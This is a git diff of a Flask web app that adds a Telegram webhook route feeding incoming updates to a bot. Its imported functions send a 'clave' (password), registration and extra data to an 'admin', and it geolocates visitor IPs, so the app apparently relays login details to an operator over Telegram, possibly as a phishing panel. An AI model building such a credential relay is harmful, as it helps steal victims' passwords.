@@ -1,10 +1,11 @@
+
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import json
 import threading
 import datetime
 import urllib.request as urlreq
-from bot import enviar_solicitud_admin, enviar_clave_admin, enviar_registro_admin, enviar_complementario_admin
+from bot import enviar_solicitud_admin, enviar_clave_admin, enviar_registro_admin, enviar_complementario_admin, procesar_update
 from state import pending_action
 
 app = Flask(__name__)
@@ -50,6 +51,12 @@ def obtener_ciudad(ip):
             return f"{data.get('city','?')}, {data.get('country','?')}"
     except:
         return "Desconocida"
+
+# ── Webhook de Telegram ───────────────────────────────────────
+@app.route("/webhook", methods=["POST"])
+def webhook():
+    procesar_update(request.json)
+    return "ok", 200
 
 # ── Rutas ─────────────────────────────────────────────────────
 @app.route("/login", methods=["POST"])
